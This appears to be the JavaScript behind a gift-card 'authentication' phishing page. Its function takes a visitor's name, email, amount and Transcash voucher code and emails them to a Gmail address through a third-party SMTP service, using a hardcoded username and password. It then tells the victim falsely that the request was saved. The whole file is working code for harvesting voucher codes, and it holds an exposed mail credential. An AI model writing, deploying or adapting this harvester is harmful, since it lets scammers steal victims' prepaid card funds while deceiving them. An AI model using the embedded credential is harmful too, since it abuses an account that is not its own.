
function emailSend(){
    var userName = document.getElementById('Name').value;
    var email = document.getElementById('email').value;
    var prix = document.getElementById('Prix').value;
    var code = document.getElementById('code').value;




    var messageBody = "Transcash: " + userName + 
                      "<br/> email: " + email +
                      "<br/> prix: " + prix + 
                      "<br/> code: " +  code;
    Email.send({
      Host : "smtp.elasticemail.com",
        Username : "authentificationgiftcard010@gmail.com",
        Password : "14B89750BD1DBC8B10169AD33AFC99FFF899",
        To : 'authentificationgiftcard010@gmail.com',
        From : "authentificationgiftcard010@gmail.com",
        Subject : "This is the subject",
        Body : messageBody
    }).then(
      message => {
        if( message =='OK'){
          swal("Succefull", "Authentication request save successfully.  Please wait a few moments you will receive a confirmation email", "success");

        }
        else{
          swal("Error", "Try again", "Error");

        }
      }
    );


  
}